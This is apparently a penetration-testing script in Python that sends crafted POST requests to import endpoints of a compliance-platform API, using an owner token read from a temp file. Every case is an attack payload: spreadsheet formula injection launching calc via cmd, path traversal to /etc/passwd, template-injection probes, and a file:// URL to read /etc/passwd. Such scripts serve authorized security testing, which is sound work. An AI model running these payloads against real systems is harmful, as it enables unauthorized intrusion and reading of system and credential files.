import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def post(path,body):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXI'+uuid.uuid4().hex[:5]
print("=== import parsers: formula / CSV injection / XXE / zip-bomb surfaces ===")
cases=[
 ('ops_audit_json', '/api/v1/ops_audit_items/import/json',
  {"items":[{"name":f"=cmd|'/c calc'!A1{tag}"},{"name":f'@SUM(1+1)*cmd|calc{tag}'},
            {"name":f'+1+1{tag}'},{"name":f'-1+1{tag}'},{"name":f'\\t=1+1{tag}'}]}),
 ('vms_csv_foreign','/api/v1/vms/csv-import',
  {"s3Key":"../../../../etc/passwd","findingIdColumn":"id",
   "assetMatchMappings":[{"auditboard_field":{"fieldName":"hostname","label":"H","type":"TEXT","canonicalReference":"auditableEntity:hostname","isCustomField":False},
                          "external_field":{"fieldName":"hostname","label":"H","type":"string","canonicalReference":"x","fieldType":"string","displayName":"H","remoteKeyName":"hostname","isRequired":False},
                          "sync_direction":"ab_to_external"}],"fieldMappings":[]}),
 ('vms_csv_ssti','/api/v1/vms/csv-import',
  {"s3Key":f"{{{{7*7}}}}{tag}.csv","findingIdColumn":"id",
   "assetMatchMappings":[{"auditboard_field":{"fieldName":"hostname","label":"H","type":"TEXT","canonicalReference":"auditableEntity:hostname","isCustomField":False},
                          "external_field":{"fieldName":"hostname","label":"H","type":"string","canonicalReference":"x","fieldType":"string","displayName":"H","remoteKeyName":"hostname","isRequired":False},
                          "sync_direction":"ab_to_external"}],"fieldMappings":[]}),
 ('frameworks_import','/api/v1/frameworks/custom-import',{"name":f"ZX{tag}"}),
 ('bcm_import','/api/v1/bcm_plans/import',{"name":f"ZX{tag}"}),
 ('regulations_import','/api/v1/regulations/import',{"url":f"file:///etc/passwd{tag}"}),
]
for label,path,body in cases:
    c,b=post(path,body)
    print(f"\n  {label:18} {c}")
    print(f"    {b[:280].replace(chr(10),' ')}")
